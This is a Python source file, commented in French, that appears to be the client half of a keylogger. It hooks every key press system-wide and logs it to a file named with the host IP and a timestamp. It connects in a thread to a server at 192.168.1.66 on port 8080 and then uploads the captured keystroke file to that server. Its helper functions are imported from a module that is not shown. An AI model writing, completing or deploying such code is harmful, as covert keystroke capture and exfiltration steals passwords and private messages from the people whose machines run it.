import keyboard, socket, functions, threading
from queue import Queue
from time import strftime

ip_host = socket.gethostbyname(socket.gethostname())
time = strftime("%Y-%m-%d_%H-%M-%S")
file_name = ip_host + "_" + time + ".txt"
ip_server = "192.168.1.66"
port = 8080
client_ssl = Queue()

# Utiliser un thread pour se connecter
thread = threading.Thread(target=functions.connexion, args=(ip_server, port, client_ssl))
thread.start()

sys = functions.detect_os()

file_path = functions.creation_fichier(file_name, sys)

# Active le mode d'enregistrement des touches
keyboard.on_press(lambda event: functions.touche_fichier(file_path, event))
try:
    # Maintient le programme en cours d'exécution
    keyboard.wait("esc")
    print("Fin de l'écoute ...")
except KeyboardInterrupt:
    pass

# Arrêt du thread et récupération des informations
thread.join()
resultat = client_ssl.get()

if resultat == "exit":
    print("Arrêt du programme...")

    # Désactive le mode d'enregistrement global des touches
    keyboard.unhook_all()
else :
    print("test3")
    # Désactive le mode d'enregistrement global des touches
    keyboard.unhook_all()

    # Envoi du fichier au serveur distant via un socket
    functions.client(file_path, resultat)


